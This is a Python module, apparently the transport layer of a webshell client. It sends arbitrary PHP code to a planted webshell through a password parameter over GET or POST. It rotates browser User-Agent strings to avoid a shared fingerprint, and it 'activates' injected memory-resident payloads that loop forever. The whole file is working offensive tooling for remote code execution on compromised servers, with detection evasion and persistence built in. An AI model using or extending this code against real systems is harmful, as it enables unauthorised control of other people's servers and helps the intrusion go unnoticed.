"""The HTTP layer: turn a string of PHP into an HTTP request to the webshell.

This is the only place that knows *how* a request is shaped (GET vs POST, which
parameter carries the payload, proxy/TLS/User-Agent).  Everything above it deals
in PHP source strings.
"""

from __future__ import annotations

import requests

from ..config import Config
from ..exceptions import ConnectionFailed

# A small pool so repeated requests don't all share one fingerprint.
_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.4 Safari/605.1.15",
]


class Transport:
    """Send raw PHP to a single webshell endpoint."""

    def __init__(self, url: str, method: str, password: str, config: Config | None = None):
        self.url = url
        self.method = method.upper()
        self.password = password
        self.config = config or Config()
        self._session = requests.Session()
        self._ua_index = 0

    def _headers(self) -> dict[str, str]:
        if self.config.user_agent:
            return {"User-Agent": self.config.user_agent}
        # Rotate through the pool deterministically.
        ua = _USER_AGENTS[self._ua_index % len(_USER_AGENTS)]
        self._ua_index += 1
        return {"User-Agent": ua}

    def send(self, php_code: str) -> str:
        """POST/GET ``php_code`` to the password parameter and return the body.

        Raises :class:`ConnectionFailed` on any network-level error instead of
        swallowing it the way v1 did.
        """
        try:
            if self.method == "POST":
                response = self._session.post(
                    self.url,
                    data={self.password: php_code},
                    headers=self._headers(),
                    timeout=self.config.timeout,
                    proxies=self.config.proxies,
                    verify=self.config.verify_ssl,
                )
            elif self.method in ("GET", "REQUEST"):
                response = self._session.get(
                    self.url,
                    params={self.password: php_code},
                    headers=self._headers(),
                    timeout=self.config.timeout,
                    proxies=self.config.proxies,
                    verify=self.config.verify_ssl,
                )
            else:
                raise ConnectionFailed(f"Unsupported method: {self.method}")
        except requests.RequestException as exc:
            raise ConnectionFailed(str(exc)) from exc
        return response.text

    def fetch(self, url: str, timeout: float) -> requests.Response:
        """GET an arbitrary URL through the same session/proxy/TLS settings.

        Used to "activate" injected memory-resident payloads: those run an
        infinite loop, so a read timeout is the *success* signal.
        """
        return self._session.get(
            url,
            headers=self._headers(),
            timeout=timeout,
            proxies=self.config.proxies,
            verify=self.config.verify_ssl,
        )

    def is_reachable(self) -> bool:
        """True if the URL answers an HTTP request at all (any status)."""
        try:
            self._session.get(
                self.url,
                headers=self._headers(),
                timeout=self.config.timeout,
                proxies=self.config.proxies,
                verify=self.config.verify_ssl,
            )
            return True
        except requests.RequestException:
            return False
